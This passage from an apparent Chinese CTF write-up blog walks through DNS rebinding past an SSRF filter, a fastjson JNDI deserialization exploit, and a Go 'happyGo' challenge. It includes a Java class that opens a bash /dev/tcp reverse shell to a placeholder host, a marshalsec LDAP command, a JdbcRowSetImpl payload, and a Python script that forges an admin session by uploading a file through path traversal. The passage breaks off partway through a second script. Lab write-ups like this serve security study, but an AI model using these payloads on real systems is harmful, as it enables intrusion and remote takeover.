<p>这里原文解释的不是很清楚，又请教了一下白师傅，才明白两个记录怎么绕过对 127.0.0.1 的检测的。首先第一次 DNS 解析在 waf 处，检查 DNS 记录是否是 127.0.0.1 ，第二次 DNS 解析在 ajax 或者请求我们传入的 url 地址的时候进行的，因为 DNS 随机解析，所以如果第一次解析，解析到了我们设置的非 127.0.0.1 的地址，就可以绕过 waf 对 127.0.0.1 的检测，否则解析到 127.0.0.1 就直接被 waf ，所以第一次通过的概率为 1/2 ；如果第二次解析，也就是在对 url 进行请求的时候，解析到了 127.0.0.1 的话，这次 ssrf 就算成功了，也就达到了我们访问内网地址的目的，如果解析不是 127.0.0.1 的话，那就失败了，所以第二次成功概率也是 1/2 。综述，整个<code>DNS Rebinding</code>采用两个<code>A</code>记录绕过的成功概率为 1/2 。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009642.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009642.jpg loading=lazy>
</a>
</figure></p>
<p>可以看到这里已经成功了。</p>
<p>传入<code>data</code>参数，因为作为<code>/secret_flag</code>的参数，这里注意要用<code>urlencode</code>，看到返回<code>WoW! Convert JSON to object...OK!&lt;br>Result: 1</code></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009810.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009810.jpg loading=lazy>
</a>
</figure></p>
<p>可以使用<code>fastjson</code>反序列化搞定，但是使用<code>vulhub</code>下的<code>fastjson</code>的 exp 直接就报了 waf</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004231.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004231.jpg loading=lazy>
</a>
</figure></p>
<p>参考<a class=link href=https://www.restran.net/2018/10/29/fastjson-rce-notes/#%E5%9F%BA%E4%BA%8E-JNDI-%E7%9A%84-PoC target=_blank rel=noopener>FastJson 反序列化漏洞利用笔记#基于 JNDI 的 PoC</a>，构造如下的<code>Exploit.java</code>，然后编译成<code>.class</code>文件放在 HTTP 服务端口下提供后续下载</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kd>public</span> <span class=kd>class</span> <span class=nc>Exploit</span> <span class=o>{</span>
    <span class=kd>public</span> <span class=nf>Exploit</span><span class=o>(){</span>
        <span class=k>try</span> <span class=o>{</span>
            <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span>
                    <span class=k>new</span> <span class=n>String</span><span class=o>[]{</span><span class=s>&#34;bash&#34;</span><span class=o>,</span> <span class=s>&#34;-c&#34;</span><span class=o>,</span> <span class=s>&#34;bash -c \&#34;sh &gt;&amp; /dev/tcp/your_ip/port 0&gt;&amp;1\&#34;&#34;</span><span class=o>});</span>
        <span class=o>}</span> <span class=k>catch</span><span class=o>(</span><span class=n>Exception</span> <span class=n>e</span><span class=o>){</span>
            <span class=n>e</span><span class=o>.</span><span class=na>printStackTrace</span><span class=o>();</span>
        <span class=o>}</span>
    <span class=o>}</span>
    <span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>argv</span><span class=o>){</span>
        <span class=n>Exploit</span> <span class=n>e</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Exploit</span><span class=o>();</span>
    <span class=o>}</span>
<span class=o>}</span>
</code></pre></div><p>在 vps 上下载<a class=link href=https://github.com/mbechler/marshalsec target=_blank rel=noopener>marshalsec</a>提供<code>ldap</code>服务，按照步骤<code>mvn clean package -DskipTests</code>编译好后，</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ java -cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your_ip:port/#Exploit
</code></pre></div><p>在一个端口起一个 HTTP 服务提供受害者下载<code>Exploit.class</code>，在发送以下 payload</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class=p>,</span><span class=nt>&#34;dataSourceName&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://your_ip:1389/Exploit&#34;</span><span class=p>,</span><span class=nt>&#34;autoCommit&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>}</span>
</code></pre></div><p>记得二次 urlencode ，成功<code>getshell</code></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002294.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002294.jpg loading=lazy>
</a>
</figure></p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003389.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003389.jpg loading=lazy>
</a>
</figure></p>
<h4 id=happygo>happyGo</h4>
<blockquote>
<p>​ 别问，问就是 cve 改的
​ flag 在/flag 里
​ source code:https://pan.baidu.com/s/1wQwqxF6DUr-2AIC_giud0g 提取码: 6v2i</p>
<p>http://94.191.10.201:7000/</p>
</blockquote>
<p>复现题 2333……orz</p>
<p>题目提供注册登录功能，登录进来后可以发送消息</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008211.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008211.jpg loading=lazy>
</a>
</figure></p>
<p>也可以修改自己的头像</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005282.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005282.jpg loading=lazy>
</a>
</figure></p>
<p>发现源码有地方</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=nx>beego</span><span class=p>.</span><span class=nf>Router</span><span class=p>(</span><span class=s>&#34;/admin&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>controllers</span><span class=p>.</span><span class=nx>AdminController</span><span class=p>{})</span>
<span class=nx>beego</span><span class=p>.</span><span class=nf>Router</span><span class=p>(</span><span class=s>&#34;/admin/user/del/:id([0-9]+&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>controllers</span><span class=p>.</span><span class=nx>UserDelController</span><span class=p>{})</span>
</code></pre></div><p>看到一个比较奇怪的功能，跟进<code>Controller</code>看看</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=kd>type</span> <span class=nx>AdminController</span> <span class=kd>struct</span> <span class=p>{</span>
	<span class=nx>beego</span><span class=p>.</span><span class=nx>Controller</span>
<span class=p>}</span>

<span class=kd>func</span> <span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>AdminController</span><span class=p>)</span> <span class=nf>Get</span><span class=p>()</span> <span class=p>{</span>
	<span class=nx>uid</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>GetSession</span><span class=p>(</span><span class=s>&#34;uid&#34;</span><span class=p>)</span>
	<span class=k>if</span> <span class=nx>uid</span> <span class=o>==</span> <span class=kc>nil</span> <span class=p>{</span>
		<span class=nx>c</span><span class=p>.</span><span class=nf>Abort</span><span class=p>(</span><span class=s>&#34;500&#34;</span><span class=p>)</span>
	<span class=p>}</span>

	<span class=k>if</span> <span class=nx>uid</span><span class=p>.(</span><span class=kt>int</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span> <span class=p>{</span>
		<span class=nx>c</span><span class=p>.</span><span class=nf>Redirect</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=p>.</span><span class=nx>StatusFound</span><span class=p>)</span>
		<span class=k>return</span>
	<span class=p>}</span>

	<span class=nx>o</span> <span class=o>:=</span> <span class=nx>orm</span><span class=p>.</span><span class=nf>NewOrm</span><span class=p>()</span>
	<span class=nx>u</span> <span class=o>:=</span> <span class=nx>models</span><span class=p>.</span><span class=nx>Users</span><span class=p>{</span><span class=nx>Id</span><span class=p>:</span><span class=nx>uid</span><span class=p>.(</span><span class=kt>int</span><span class=p>)}</span>
	<span class=nx>us</span> <span class=o>:=</span> <span class=p>[]</span><span class=nx>models</span><span class=p>.</span><span class=nx>Users</span><span class=p>{}</span>

	<span class=nx>err</span> <span class=o>:=</span> <span class=nx>o</span><span class=p>.</span><span class=nf>Read</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>u</span><span class=p>)</span>
	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
		<span class=nx>c</span><span class=p>.</span><span class=nf>Abort</span><span class=p>(</span><span class=s>&#34;500&#34;</span><span class=p>)</span>
	<span class=p>}</span>

	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>o</span><span class=p>.</span><span class=nf>QueryTable</span><span class=p>(</span><span class=s>&#34;users&#34;</span><span class=p>).</span><span class=nf>Filter</span><span class=p>(</span><span class=s>&#34;id__gt&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>).</span><span class=nf>All</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>us</span><span class=p>)</span>
	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
		<span class=nx>c</span><span class=p>.</span><span class=nf>Abort</span><span class=p>(</span><span class=s>&#34;500&#34;</span><span class=p>)</span>
	<span class=p>}</span>

	<span class=nx>c</span><span class=p>.</span><span class=nx>Data</span><span class=p>[</span><span class=s>&#34;Users&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=nx>us</span>
	<span class=nx>c</span><span class=p>.</span><span class=nx>Data</span><span class=p>[</span><span class=s>&#34;Avatar&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=nx>u</span><span class=p>.</span><span class=nx>Avatar</span>
	<span class=nx>c</span><span class=p>.</span><span class=nx>Data</span><span class=p>[</span><span class=s>&#34;Username&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=nx>u</span><span class=p>.</span><span class=nx>Username</span>
	<span class=nx>c</span><span class=p>.</span><span class=nx>Data</span><span class=p>[</span><span class=s>&#34;UID&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=nx>u</span><span class=p>.</span><span class=nx>Id</span>

	<span class=nx>c</span><span class=p>.</span><span class=nx>TplName</span> <span class=p>=</span> <span class=s>&#34;admin.tpl&#34;</span>
<span class=p>}</span>

<span class=kd>type</span> <span class=nx>UserDelController</span> <span class=kd>struct</span> <span class=p>{</span>
	<span class=nx>beego</span><span class=p>.</span><span class=nx>Controller</span>
<span class=p>}</span>

<span class=kd>func</span> <span class=p>(</span><span class=nx>u</span> <span class=o>*</span><span class=nx>UserDelController</span><span class=p>)</span> <span class=nf>Get</span><span class=p>()</span> <span class=p>{</span>
	<span class=nx>uid</span> <span class=o>:=</span> <span class=nx>u</span><span class=p>.</span><span class=nf>GetSession</span><span class=p>(</span><span class=s>&#34;uid&#34;</span><span class=p>)</span>
	<span class=k>if</span> <span class=nx>uid</span> <span class=o>==</span> <span class=kc>nil</span> <span class=p>{</span>
		<span class=nx>u</span><span class=p>.</span><span class=nf>Abort</span><span class=p>(</span><span class=s>&#34;500&#34;</span><span class=p>)</span>
	<span class=p>}</span>

	<span class=k>if</span> <span class=nx>uid</span><span class=p>.(</span><span class=kt>int</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span> <span class=p>{</span>
		<span class=nx>u</span><span class=p>.</span><span class=nf>Redirect</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=p>.</span><span class=nx>StatusFound</span><span class=p>)</span>
		<span class=k>return</span>
	<span class=p>}</span>

	<span class=nx>id</span> <span class=o>:=</span> <span class=nx>u</span><span class=p>.</span><span class=nx>Ctx</span><span class=p>.</span><span class=nx>Input</span><span class=p>.</span><span class=nf>Param</span><span class=p>(</span><span class=s>&#34;:id&#34;</span><span class=p>)</span>
	<span class=nx>i</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>strconv</span><span class=p>.</span><span class=nf>Atoi</span><span class=p>(</span><span class=nx>id</span><span class=p>)</span>
	<span class=k>if</span> <span class=nx>i</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>{</span>
		<span class=nx>u</span><span class=p>.</span><span class=nf>Redirect</span><span class=p>(</span><span class=s>&#34;/admin&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=p>.</span><span class=nx>StatusFound</span><span class=p>)</span>
		<span class=k>return</span>
	<span class=p>}</span>

	<span class=nx>o</span> <span class=o>:=</span> <span class=nx>orm</span><span class=p>.</span><span class=nf>NewOrm</span><span class=p>()</span>
	<span class=nx>user</span> <span class=o>:=</span> <span class=nx>models</span><span class=p>.</span><span class=nx>Users</span><span class=p>{</span><span class=nx>Id</span><span class=p>:</span><span class=nx>i</span><span class=p>}</span>
	<span class=nx>err</span> <span class=o>:=</span> <span class=nx>o</span><span class=p>.</span><span class=nf>Read</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>user</span><span class=p>)</span>
	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
		<span class=nx>u</span><span class=p>.</span><span class=nf>Abort</span><span class=p>(</span><span class=s>&#34;500&#34;</span><span class=p>)</span>
	<span class=p>}</span>

	<span class=k>if</span> <span class=nx>user</span><span class=p>.</span><span class=nx>Avatar</span> <span class=o>!=</span> <span class=s>&#34;/static/img/avatar.jpg&#34;</span> <span class=p>{</span>
		<span class=nx>os</span><span class=p>.</span><span class=nf>Remove</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>Avatar</span><span class=p>)</span>
	<span class=p>}</span>

	<span class=nx>o</span><span class=p>.</span><span class=nf>QueryTable</span><span class=p>(</span><span class=s>&#34;messages&#34;</span><span class=p>).</span><span class=nf>Filter</span><span class=p>(</span><span class=s>&#34;uid&#34;</span><span class=p>,</span> <span class=nx>id</span><span class=p>).</span><span class=nf>Delete</span><span class=p>()</span>
	<span class=nx>o</span><span class=p>.</span><span class=nf>Delete</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>user</span><span class=p>)</span>

	<span class=nx>u</span><span class=p>.</span><span class=nf>Redirect</span><span class=p>(</span><span class=s>&#34;/admin&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=p>.</span><span class=nx>StatusFound</span><span class=p>)</span>
<span class=p>}</span>
</code></pre></div><p>虽然看起来<code>Go</code>语言有点古怪，但是代码逻辑还是大致懂得，看起来逻辑都比较正常，但是在<code>os.Remove(user.Avatar)</code>，存在一个越权，因为我们可以控制<code>user.Avatar</code>，我们就可以删除任意文件了。</p>
<p>还有一个路由就是<code>/install</code>路由</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=nx>beego</span><span class=p>.</span><span class=nf>Router</span><span class=p>(</span><span class=s>&#34;/install&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>controllers</span><span class=p>.</span><span class=nx>InstallController</span><span class=p>{})</span>
</code></pre></div><p>查看<code>InstallController</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=kd>type</span> <span class=nx>InstallController</span> <span class=kd>struct</span> <span class=p>{</span>
	<span class=nx>beego</span><span class=p>.</span><span class=nx>Controller</span>
<span class=p>}</span>

<span class=kd>func</span> <span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>InstallController</span><span class=p>)</span> <span class=nf>Get</span><span class=p>()</span> <span class=p>{</span>
	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Stat</span><span class=p>(</span><span class=s>&#34;conf/app.conf&#34;</span><span class=p>)</span>
	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=o>&amp;&amp;</span> <span class=nx>os</span><span class=p>.</span><span class=nf>IsNotExist</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
		<span class=nx>c</span><span class=p>.</span><span class=nx>TplName</span> <span class=p>=</span> <span class=s>&#34;install.tpl&#34;</span>
	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
		<span class=nx>c</span><span class=p>.</span><span class=nf>Redirect</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=p>.</span><span class=nx>StatusFound</span><span class=p>)</span>
		<span class=k>return</span>
	<span class=p>}</span>
<span class=p>}</span>


<span class=kd>func</span> <span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>InstallController</span><span class=p>)</span> <span class=nf>Post</span><span class=p>()</span> <span class=p>{</span>
	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Stat</span><span class=p>(</span><span class=s>&#34;conf/app.conf&#34;</span><span class=p>)</span>
	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=o>&amp;&amp;</span> <span class=nx>os</span><span class=p>.</span><span class=nf>IsNotExist</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
		<span class=c1>//pass
</span><span class=c1></span>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
		<span class=nx>c</span><span class=p>.</span><span class=nf>Redirect</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=p>.</span><span class=nx>StatusFound</span><span class=p>)</span>
		<span class=k>return</span>
	<span class=p>}</span>
	<span class=kd>type</span> <span class=nx>data</span> <span class=kd>struct</span> <span class=p>{</span>
		<span class=nx>Host</span> <span class=kt>string</span>	<span class=s>`form:&#34;host&#34;`</span>
		<span class=nx>Port</span> <span class=kt>string</span>	<span class=s>`form:&#34;port&#34;`</span>
		<span class=nx>Username</span> <span class=kt>string</span>	<span class=s>`form:&#34;username&#34;`</span>
		<span class=nx>Password</span> <span class=kt>string</span>	<span class=s>`form:&#34;password&#34;`</span>
		<span class=nx>Database</span> <span class=kt>string</span>	<span class=s>`form:&#34;database&#34;`</span>
	<span class=p>}</span>
	<span class=nx>d</span> <span class=o>:=</span> <span class=nx>data</span><span class=p>{}</span>

	<span class=k>if</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>ParseForm</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>d</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
		<span class=nx>c</span><span class=p>.</span><span class=nf>Abort</span><span class=p>(</span><span class=s>&#34;500&#34;</span><span class=p>)</span>
	<span class=p>}</span>

	<span class=nx>s</span> <span class=o>:=</span> <span class=s>`[mysql]
</span><span class=s>username = %s
</span><span class=s>password = %s
</span><span class=s>host = %s
</span><span class=s>port = %s
</span><span class=s>database = %s
</span><span class=s>`</span>
	<span class=nx>err</span> <span class=p>=</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>WriteFile</span><span class=p>(</span><span class=s>&#34;conf/app.conf&#34;</span><span class=p>,</span> <span class=p>[]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprintf</span><span class=p>(</span><span class=nx>s</span><span class=p>,</span> <span class=nx>d</span><span class=p>.</span><span class=nx>Username</span><span class=p>,</span> <span class=nx>d</span><span class=p>.</span><span class=nx>Password</span><span class=p>,</span> <span class=nx>d</span><span class=p>.</span><span class=nx>Host</span><span class=p>,</span> <span class=nx>d</span><span class=p>.</span><span class=nx>Port</span><span class=p>,</span> <span class=nx>d</span><span class=p>.</span><span class=nx>Database</span><span class=p>)),</span><span class=mo>0666</span><span class=p>)</span>
	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
		<span class=nx>c</span><span class=p>.</span><span class=nf>Abort</span><span class=p>(</span><span class=s>&#34;500&#34;</span><span class=p>)</span>
	<span class=p>}</span>
	<span class=nx>c</span><span class=p>.</span><span class=nf>Redirect</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=nx>http</span><span class=p>.</span><span class=nx>StatusFound</span><span class=p>)</span>
<span class=p>}</span>
</code></pre></div><p>根据<a class=link href=https://lightless.me/archives/read-mysql-client-file.html target=_blank rel=noopener>Read MySQL Client&rsquo;s File</a>，应该是出题人的博客了吧 2333&mldr;
大致我们可以猜测整个流程，登录管理员，删除<code>app.conf</code>，重新<code>install</code>，用恶意<code>mysql</code>服务器读取任意文件。而登录管理员就需要看到在<code>main.go</code>中的主函数了</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
	<span class=nx>beego</span><span class=p>.</span><span class=nx>BConfig</span><span class=p>.</span><span class=nx>WebConfig</span><span class=p>.</span><span class=nx>Session</span><span class=p>.</span><span class=nx>SessionName</span> <span class=p>=</span> <span class=s>&#34;PHPSESSID&#34;</span>
	<span class=nx>beego</span><span class=p>.</span><span class=nx>BConfig</span><span class=p>.</span><span class=nx>WebConfig</span><span class=p>.</span><span class=nx>Session</span><span class=p>.</span><span class=nx>SessionProvider</span><span class=p>=</span><span class=s>&#34;file&#34;</span>
	<span class=nx>beego</span><span class=p>.</span><span class=nx>BConfig</span><span class=p>.</span><span class=nx>WebConfig</span><span class=p>.</span><span class=nx>Session</span><span class=p>.</span><span class=nx>SessionProviderConfig</span> <span class=p>=</span> <span class=s>&#34;./tmp&#34;</span>
	<span class=nx>beego</span><span class=p>.</span><span class=nx>BConfig</span><span class=p>.</span><span class=nx>WebConfig</span><span class=p>.</span><span class=nx>Session</span><span class=p>.</span><span class=nx>SessionOn</span> <span class=p>=</span> <span class=kc>true</span>
	<span class=nx>beego</span><span class=p>.</span><span class=nf>Run</span><span class=p>()</span>
<span class=p>}</span>
</code></pre></div><p>搭环境始终没找到<code>catmsg/routers</code>这个包&mldr;蜜汁尴尬，还是放弃了。而且<code>writeup</code>写的极其简单&mldr;并没有详细剖析原理。</p>
<p>贴一下其他师傅的脚本，<code>session</code>伪造脚本</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># coding:utf-8</span>
<span class=kn>import</span> <span class=nn>requests</span>
<span class=kn>import</span> <span class=nn>base64</span>

<span class=n>ip</span><span class=o>=</span><span class=s2>&#34;94.191.10.201&#34;</span>
<span class=n>host</span><span class=o>=</span><span class=s2>&#34;http://94.191.10.201:7000&#34;</span>
<span class=n>registerURL</span> <span class=o>=</span> <span class=n>host</span> <span class=o>+</span> <span class=s2>&#34;/auth/register&#34;</span>
<span class=n>loginURL</span> <span class=o>=</span> <span class=n>host</span> <span class=o>+</span> <span class=s2>&#34;/auth/login&#34;</span>
<span class=n>userinfoURL</span> <span class=o>=</span> <span class=n>host</span> <span class=o>+</span> <span class=s2>&#34;/userinfo&#34;</span>
<span class=n>req</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>

<span class=c1># register</span>

<span class=n>registerData</span><span class=o>=</span><span class=p>{</span>    <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;ii5am3&#34;</span><span class=p>,</span>    <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;123456&#34;</span><span class=p>,</span>    <span class=s2>&#34;confirmpass&#34;</span><span class=p>:</span><span class=s2>&#34;123456&#34;</span><span class=p>,}</span>

<span class=n>r</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>registerURL</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>registerData</span><span class=p>)</span>

<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] register &#34;</span><span class=o>+</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>

<span class=c1># login</span>

<span class=n>loginData</span><span class=o>=</span><span class=p>{</span>    <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;ii5am3&#34;</span><span class=p>,</span>    <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;123456&#34;</span><span class=p>,}</span>

<span class=n>r</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>loginURL</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>loginData</span><span class=p>)</span>

<span class=nb>print</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;[+] login &#34;</span><span class=o>+</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>



<span class=c1># 获取当前登陆用户的sessionID</span>

<span class=n>sessionID</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>_cookies</span><span class=o>.</span><span class=n>_cookies</span><span class=p>[</span><span class=n>ip</span><span class=p>][</span><span class=s2>&#34;/&#34;</span><span class=p>][</span><span class=s2>&#34;PHPSESSID&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>value</span>

<span class=nb>print</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;[+] sessionID is &#34;</span><span class=o>+</span> <span class=n>sessionID</span><span class=p>)</span>



<span class=c1># 上传session，伪造cookie</span>

<span class=n>newSession</span> <span class=o>=</span> <span class=n>sessionID</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;5am3&#34;</span>

<span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;../../tmp/</span><span class=si>%s</span><span class=s2>/</span><span class=si>%s</span><span class=s2>/</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span><span class=p>(</span><span class=n>sessionID</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>sessionID</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=n>newSession</span><span class=p>)</span>



<span class=c1># 本地搭建环境，登入uid为1的账号，然后获取他的session的文件即可。在这里我给大家</span>

<span class=n>attackSession</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=s2>&#34;Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC&#34;</span><span class=p>)</span>

<span class=n>sessionFiles</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;uploadname&#34;</span> <span class=p>:</span> <span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>attackSession</span><span class=p>)}</span>

<span class=n>r</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>userinfoURL</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>sessionFiles</span><span class=p>)</span>

<span class=nb>print</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;[+] newCookie is: PHPSESSID=&#34;</span><span class=o>+</span> <span class=n>newSession</span><span class=p>)</span>
</code></pre></div><p>伪造服务端脚本：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># coding:utf-8</span>
<span class=kn>import</span> <span class=nn>requests</span>
<span class=kn>import</span> <span class=nn>base64</span>
<span class=c1># req表示user1，此时全程用该一个session</span>
<span class=n>req</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
<span class=n>ip</span> <span class=o>=</span> <span class=s2>&#34;94.191.10.201&#34;</span>
<span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;http://94.191.10.201:7000&#34;</span>
<span class=n>registerURL</span> <span class=o>=</span> <span class=n>host</span> <span class=o>+</span> <span class=s2>&#34;/auth/register&#34;</span>
<span class=n>loginURL</span><span class=o>=</span> <span class=n>host</span> <span class=o>+</span> <span class=s2>&#34;/auth/login&#34;</span>
<span class=n>userinfoURL</span> <span class=o>=</span> <span class=n>host</span> <span class=o>+</span> <span class=s2>&#34;/userinfo&#34;</span>
<span class=n>deleteUserURL</span> <span class=o>=</span> <span class=n>host</span> <span class=o>+</span><span class=s2>&#34;/admin/user/del/2&#34;</span>
<span class=n>installURl</span> <span class=o>=</span> <span class=n>host</span> <span class=o>+</span> <span class=s2>&#34;/install&#34;</span>
<span class=n>attackCookie</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=s2>&#34;Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC&#34;</span><span class=p>)</span>

<span class=c1># register</span>
<span class=n>registerData</span><span class=o>=</span><span class=p>{</span>    <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;ii5am3&#34;</span><span class=p>,</span>    <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;123456&#34;</span><span class=p>,</span>    <span class=s2>&#34;confirmpass&#34;</span><span class=p>:</span><span class=s2>&#34;123456&#34;</span><span class=p>,}</span>
